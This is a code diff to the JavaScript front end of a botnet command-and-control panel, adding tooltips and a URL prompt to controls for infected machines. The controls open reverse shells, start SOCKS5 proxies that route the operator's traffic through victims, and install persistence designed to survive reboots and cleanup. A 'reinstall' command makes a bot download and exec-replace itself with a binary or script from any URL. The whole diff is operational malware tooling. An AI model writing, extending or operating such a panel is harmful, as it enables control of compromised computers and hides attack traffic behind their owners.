@@ -350,7 +350,7 @@ function createBotRow(b) {
   var eid = b.botID.replace(/'/g, "\\'");
   tr.innerHTML =
     '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
-    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" title="Click to target this bot">' + escHtml(b.botID) + '</span></td>' +
+    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" data-tooltip="Click to set as target in Command Center">  ' + escHtml(b.botID) + '</span></td>' +
     '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
     '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
     '<td>' + groupTagHtml(b.group) + '</td>' +
@@ -752,15 +752,15 @@ function fillPopup(b) {
 
   var acts = document.getElementById('popup-actions');
   var id = b.botID.replace(/'/g, "\\'");
-  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
-  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')">Shell</button>';
+  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
+  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>';
   if (b.socksActive) {
-    html += '<button class="popup-act act-stopsocks" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>';
+    html += '<button class="popup-act act-stopsocks" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>';
   } else {
-    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
+    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
   }
-  html += '<button class="popup-act act-persist" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>';
-  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')">Kill</button>';
+  html += '<button class="popup-act act-persist" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install triple-redundant persistence: copies binary to hidden dir, adds systemd unit, cron entry, and rc.local — survives reboots and cleanup attempts">Persist</button>';
+  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence artifacts, delete the binary, and terminate — cannot be undone">Kill</button>';
   acts.innerHTML = html;
 }
 
@@ -847,19 +847,19 @@ function renderBotSidebar(b) {
 
   // ── Quick actions ────────────────────────────────────────────────────────
   var socksToggle = b.socksActive
-    ? '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>'
-    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
+    ? '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>'
+    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
 
   var actions =
     '<div class="bds-section">' +
     '<div class="bds-section-title">Actions</div>' +
     '<div class="bds-action-grid">' +
-    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')">Shell</button>' +
+    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>' +
     socksToggle +
-    '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>' +
-    '<button class="bds-btn" onclick="popupCmd(\'' + id + '\',\'!reinstall\')">Reinstall</button>' +
-    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')">Set Group</button>' +
-    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')">Kill</button>' +
+    '<button class="bds-btn" onclick="popupPersist(\'' + id + '\')" data-tooltip="Copy binary to hidden dir + install systemd unit — optionally provide a URL as fallback">Persist</button>' +
+    '<button class="bds-btn" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch a new ELF or .sh from a URL and exec-replace the running bot process">Reinstall</button>' +
+    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">Set Group</button>' +
+    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence, delete binary, terminate — irreversible">Kill</button>' +
     '</div></div>';
 
   // ── Command console ──────────────────────────────────────────────────────
@@ -868,16 +868,17 @@ function renderBotSidebar(b) {
     '<div class="bds-section-title">Send Command</div>' +
     '<div class="bds-cmd-row">' +
     '<input class="bds-cmd-input" id="bds-cmd-input" placeholder="!shell ls -la, !detach ..." ' +
+      'title="Type any !command and press Enter or Send to run it on this bot specifically" ' +
       'onkeydown="if(event.key===\'Enter\')bdsSendCmd(\'' + id + '\')">' +
-    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')">Send</button>' +
+    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')" data-tooltip="Send command to this bot only">Send</button>' +
     '</div>' +
     '<div class="bds-cmd-chips">' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'">!shell</span>' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'">!detach</span>' +
-    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'">!stream</span>' +
-    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')">!stopsocks</span>' +
-    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!persist\')">!persist</span>' +
-    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!reinstall\')">!reinstall</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'" data-tooltip="Run a command and return output">!shell</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'" data-tooltip="Run a command in the background, detached from the session">!detach</span>' +
+    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'" data-tooltip="Run a command with real-time line-by-line output streaming">!stream</span>' +
+    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Stop the SOCKS5 proxy running on this bot">!stopsocks</span>' +
+    '<span class="bds-chip" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install persistence — optionally provide a fallback URL">!persist</span>' +
+    '<span class="bds-chip" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch binary/script from URL and exec-replace this bot">!reinstall</span>' +
     '</div></div>';
 
   document.getElementById('bds-body').innerHTML = info + actions + console_;
@@ -918,29 +919,29 @@ function popupStartSocks(botID) {
   overlay.innerHTML =
     '<div class="socks-modal">' +
     '<div class="socks-modal-title">Start SOCKS5 Proxy</div>' +
-    '<div class="cmd-args">' +
-    '<div class="cmd-group">' +
+    '<div class="socks-modal-fields">' +
+    '<div class="socks-modal-field">' +
     '<label>Mode</label>' +
     '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
     '<option value="direct">Direct (listen on bot)</option>' +
     '<option value="relay">Relay (backconnect)</option>' +
     '</select>' +
     '</div>' +
-    '<div class="cmd-group" id="socks-m-port-row">' +
+    '<div class="socks-modal-field" id="socks-m-port-row">' +
     '<label>Listen Port</label>' +
     '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
     '</div>' +
-    '<div class="cmd-group" id="socks-m-relay-row" style="display:none">' +
+    '<div class="socks-modal-field" id="socks-m-relay-row" style="display:none">' +
     '<label>Relay</label>' +
     '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
     '</div>' +
-    '<div class="cmd-group">' +
-    '<label>Username (optional)</label>' +
+    '<div class="socks-modal-field">' +
+    '<label>Username</label>' +
     '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
     '</div>' +
-    '<div class="cmd-group">' +
-    '<label>Password (optional)</label>' +
-    '<input type="password" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
+    '<div class="socks-modal-field">' +
+    '<label>Password</label>' +
+    '<input type="text" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
     '</div>' +
     '</div>' +
     '<div class="socks-modal-btns">' +
@@ -2413,6 +2414,102 @@ function showConfirm(opts) {
   // Esc key
   function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
   document.addEventListener('keydown', onKey);
+}
+
+// showUrlInput — like showConfirm but includes a URL text field.
+// opts: { title, message, placeholder, required, confirmText, icon, onConfirm(url) }
+function showUrlInput(opts) {
+  var old = document.getElementById('confirm-overlay');
+  if (old) old.remove();
+
+  var iconClass = opts.icon || 'warn';
+  var iconChar = iconClass === 'warn' ? '\u26A0' : '\u2193';
+  var btnClass = opts.confirmClass || 'ok';
+  var inputId = 'url-input-field';
+
+  var overlay = document.createElement('div');
+  overlay.id = 'confirm-overlay';
+  overlay.className = 'confirm-overlay';
+  overlay.innerHTML =
+    '<div class="confirm-box">' +
+    '<div class="confirm-header">' +
+    '<div class="confirm-icon ' + iconClass + '">' + iconChar + '</div>' +
+    '<div class="confirm-title">' + escHtml(opts.title || 'Enter URL') + '</div>' +
+    '</div>' +
+    '<div class="confirm-body">' +
+    '<div class="confirm-msg">' + escHtml(opts.message || '') + '</div>' +
+    '<input id="' + inputId + '" class="confirm-url-input" type="text" ' +
+      'placeholder="' + escHtml(opts.placeholder || 'https://') + '" autocomplete="off" spellcheck="false">' +
+    '</div>' +
+    '<div class="confirm-footer">' +
+    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
+    '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
+    escHtml(opts.confirmText || 'Send') +
+    '</button>' +
+    '</div>' +
+    '</div>';
+
+  document.body.appendChild(overlay);
+  requestAnimationFrame(function () {
+    overlay.classList.add('open');
+    document.getElementById(inputId).focus();
+  });
+
+  function close() {
+    overlay.classList.remove('open');
+    setTimeout(function () { overlay.remove(); }, 160);
+  }
+
+  function submit() {
+    var url = document.getElementById(inputId).value.trim();
+    if (opts.required && !url) {
+      document.getElementById(inputId).style.borderColor = 'var(--red)';
+      document.getElementById(inputId).focus();
+      return;
+    }
+    close();
+    if (opts.onConfirm) opts.onConfirm(url);
+  }
+
+  document.getElementById('confirm-cancel').onclick = close;
+  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
+  document.getElementById('confirm-ok').onclick = submit;
+  document.getElementById(inputId).addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') submit();
+    if (e.key === 'Escape') close();
+  });
+  function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
+  document.addEventListener('keydown', onKey);
+}
+
+function popupPersist(botID) {
+  showUrlInput({
+    title: 'Persist',
+    message: 'Optional: URL to fetch binary/script as fallback if the bot\'s binary is unreadable on disk. Leave blank to copy the running binary.',
+    placeholder: 'https://host/bot.elf  (optional)',
+    required: false,
+    confirmText: 'Persist',
+    icon: 'warn',
+    confirmClass: 'ok',
+    onConfirm: function (url) {
+      popupCmd(botID, url ? '!persist ' + url : '!persist');
+    }
+  });
+}
+
+function popupReinstall(botID) {
+  showUrlInput({
+    title: 'Reinstall',
+    message: 'URL of ELF binary or shell script to fetch. The bot will download it, write to a temp file, and exec-replace itself.',
+    placeholder: 'https://host/bot.elf',
+    required: true,
+    confirmText: 'Reinstall',
+    icon: 'warn',
+    confirmClass: 'danger',
+    onConfirm: function (url) {
+      popupCmd(botID, '!reinstall ' + url);
+    }
+  });
 }
 
 function fireAttack() {
